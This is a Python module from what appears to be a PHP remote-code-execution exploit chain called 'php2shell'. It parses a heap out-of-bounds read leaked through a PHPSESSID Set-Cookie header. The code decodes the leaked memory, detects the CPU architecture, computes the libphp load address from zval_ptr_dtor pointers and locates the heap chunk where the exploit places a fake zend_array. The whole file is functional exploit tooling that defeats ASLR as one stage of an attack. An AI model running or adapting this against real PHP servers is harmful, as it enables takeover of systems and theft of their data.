"""Leak parser for the php2shell OOB read.

Extracts heap pointers from the Set-Cookie header in the B1 response.
The stale session ID points to a fake zend_string with a large len field,
causing php_url_encode to read far past the legitimate string boundary.
The URL-encoded cookie value contains raw heap memory including:
  - Chunk-internal pointers (2MiB-aligned clusters)
  - libphp pointers (zval_ptr_dtor from real HashTable pDestructor fields)
  - Main chunk pointers

Architecture detection: x86_64 pointers live in 0x7f0000000000..0x7fffffffffff,
aarch64 pointers in 0xffff00000000..0xffffffffffff or 0xaaaa00000000..0xaaaafffffeff.
"""
from __future__ import annotations

import struct
import urllib.parse
from collections import Counter
from dataclasses import dataclass, field


# Stable pointer count for the main chunk bucket in the 128M layout.
# The X:900 nested array fields produce exactly 87 pointers into the
# main chunk's first 2MiB, regardless of ASLR randomization.
DEFAULT_MAIN_BUCKET_COUNT = 87


@dataclass
class LeakResult:
    decoded_len: int = 0
    arch: str = ""  # "x86_64" or "aarch64"
    zval_ptr_dtor_addr: int = 0
    zval_ptr_dtor_count: int = 0
    libphp_base: int = 0
    main_chunk_candidates: list = field(default_factory=list)
    buckets: dict = field(default_factory=dict)
    all_pointers: int = 0
    raw_decoded: bytes = b""


def _is_heap_pointer(q: int) -> bool:
    """Check if a 64-bit value looks like a user-space pointer.

    Uses a generic range (0x10000 < v < 0x0001000000000000) that covers both
    x86_64 and aarch64 address spaces without architecture-specific checks.
    Filters out common non-pointer values (small integers, fill patterns).
    """
    if q <= 0x10000 or q >= 0x0001000000000000:
        return False
    # Filter obvious fill patterns
    if q == 0x4141414141414141 or q == 0x4242424242424242:
        return False
    if q == 0x5353535353535353 or q == 0x5555555555555555:
        return False
    # Must have at least some high bits set (real pointers do)
    if q < 0x400000000000:
        return False
    return True


def _detect_arch(counts: Counter) -> str:
    """Detect architecture from pointer distribution."""
    x86 = sum(c for q, c in counts.items() if 0x7f0000000000 <= q <= 0x7fffffffffff)
    arm_high = sum(c for q, c in counts.items() if 0xffff00000000 <= q <= 0xffffffffffff)
    arm_low = sum(c for q, c in counts.items() if 0xaaaa00000000 <= q <= 0xaaaafffffeff)
    arm = arm_high + arm_low
    if x86 > arm:
        return "x86_64"
    elif arm > x86:
        return "aarch64"
    return "unknown"


def extract_cookie(resp: bytes) -> bytes:
    """Extract and URL-decode the PHPSESSID cookie value from raw HTTP response."""
    marker = b"Set-Cookie: PHPSESSID="
    i = resp.find(marker)
    if i < 0:
        raise RuntimeError(f"no Set-Cookie in leak response ({len(resp)} bytes)")
    val = resp[i + len(marker):].split(b"\r\n")[0]
    # Remove any cookie attributes (path, expires, etc.)
    val = val.split(b";")[0]
    # PHP's php_url_encode converts \x20 (space) to '+', but Python's
    # unquote_to_bytes does NOT decode '+' back to \x20. This corrupts any
    # leaked pointer containing a 0x20 byte (common on ARM64).
    val = val.replace(b"+", b"%20")
    return urllib.parse.unquote_to_bytes(val.decode("latin1"))


def parse_leak(resp: bytes, dtor_offset: int,
               main_bucket_count: int = DEFAULT_MAIN_BUCKET_COUNT) -> LeakResult:
    """Parse the B1 OOB-read response and extract addresses.

    The leaked Set-Cookie contains URL-encoded raw heap memory. We scan it
    for 8-byte aligned values that look like pointers and cluster them by
    2MiB alignment to identify:

    1. zval_ptr_dtor address: the most common pointer overall (appears ~1095
       times from the X:900 fields' real HashTable pDestructor fields).
       Subtracting dtor_offset gives the libphp load address.

    2. Main chunk base: after removing the libphp cluster and the dominant
       id-chunk cluster, the bucket whose count is closest to main_bucket_count
       is the main chunk. The exploit places its fake zend_array at a known
       offset from main chunk base.

    Args:
        resp: Raw HTTP response bytes from B1.
        dtor_offset: Offset of zval_ptr_dtor within libphp.so (from ELF symbols).
        main_bucket_count: Expected pointer count for the main chunk bucket.

    Returns:
        LeakResult with addresses and architecture detection.
    """
    decoded = extract_cookie(resp)
    result = LeakResult(decoded_len=len(decoded), raw_decoded=decoded)

    # Scan for heap/library pointers
    counts = Counter()
    for off in range(0, len(decoded) - 8, 8):
        q = struct.unpack_from("<Q", decoded, off)[0]
        if _is_heap_pointer(q):
            counts[q] += 1

    if not counts:
        raise RuntimeError("no heap pointers in leak window")

    result.all_pointers = sum(counts.values())
    result.arch = _detect_arch(counts)

    # Most common pointer = zval_ptr_dtor
    zdtor, n = counts.most_common(1)[0]
    result.zval_ptr_dtor_addr = zdtor
    result.zval_ptr_dtor_count = n
    result.libphp_base = zdtor - dtor_offset

    # Cluster pointers by 2MiB alignment to find chunk bases
    buckets = Counter()
    for q, c in counts.items():
        b = q & ~0x1FFFFF  # 2MiB alignment mask
        buckets[b] += c

    result.buckets = dict(buckets.most_common())

    # Remove the libphp bucket and the dominant id-chunk bucket
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    candidates = [(b, c) for b, c in buckets.most_common()
                  if b not in (lib_bucket, id_bucket)]

    # Sort by proximity to expected main chunk pointer count
    candidates.sort(key=lambda bc: (abs(bc[1] - main_bucket_count), bc[1]))
    result.main_chunk_candidates = [b for b, _ in candidates[:5]]

    return result


def validate_leak(result: LeakResult, delta_min: int = 0x100000,
                  delta_max: int = 0xC000000) -> tuple[bool, str]:
    """Validate that the leak produced plausible addresses.

    Checks:
      - libphp base is page-aligned (or close to aligned for emulated environments)
      - At least one main chunk candidate exists
      - libphp-to-main-chunk delta is within expected range

    The delta range is widened from the original x86_64-only 0x1A00000-0x1F00000
    to 0x100000-0xC000000 to accommodate different architectures and memory layouts.
    """
    if not result.main_chunk_candidates:
        return False, "no main-chunk candidate found"

    main = result.main_chunk_candidates[0]
    delta = abs(result.libphp_base - main)

    if not (delta_min <= delta <= delta_max):
        return False, f"implausible libphp-main delta {delta:#x} (expected {delta_min:#x}-{delta_max:#x})"

    # Check alignment (relaxed: allow up to 0xfff misalignment for emulated envs)
    misalign = result.libphp_base & 0xFFF
    if misalign != 0:
        return False, f"libphp base {result.libphp_base:#x} not page-aligned (off by {misalign:#x})"

    return True, "ok"
